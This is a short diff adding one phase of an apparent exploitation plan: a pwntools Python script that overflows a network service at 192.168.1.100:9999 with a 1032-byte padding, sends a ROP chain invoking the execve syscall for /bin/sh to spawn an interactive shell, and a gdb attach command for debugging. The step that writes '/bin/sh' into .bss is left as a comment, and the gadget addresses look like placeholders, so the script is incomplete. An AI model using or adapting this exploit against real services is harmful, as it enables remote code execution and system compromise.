@@ -1,0 +1,48 @@
+**Phase 4: Exploit Development & Testing**
+- **Complete Exploit Script**:
+  ```python
+  # exploit.py
+  from pwn import *
+  
+  context.arch = 'amd64'
+  context.log_level = 'debug'
+  
+  # Target
+  HOST = '192.168.1.100'
+  PORT = 9999
+  
+  # Offsets & Addresses
+  OFFSET = 1032
+  POP_RDI = 0x401234
+  POP_RSI = 0x401236
+  POP_RDX = 0x401238
+  POP_RAX = 0x40123a
+  SYSCALL = 0x40123c
+  BIN_SH = 0x404000  # .bss section
+  
+  # Build ROP chain
+  rop = b""
+  rop += p64(POP_RAX) + p64(59)
+  rop += p64(POP_RDI) + p64(BIN_SH)
+  rop += p64(POP_RSI) + p64(0)
+  rop += p64(POP_RDX) + p64(0)
+  rop += p64(SYSCALL)
+  
+  # Write /bin/sh to .bss (if needed)
+  # Use read() or write gadget
+  
+  # Final payload
+  payload = b"A" * OFFSET
+  payload += rop
+  
+  # Connect and send
+  p = remote(HOST, PORT)
+  p.send(b"VULN " + payload + b"\r\n")
+  p.interactive()
+  ```
+- **Debug with GDB**:
+  ```bash
+  gdb -p $(pgrep vuln_service)
+  # Set breakpoint at ret
+  # Verify ROP chain execution
+  ```
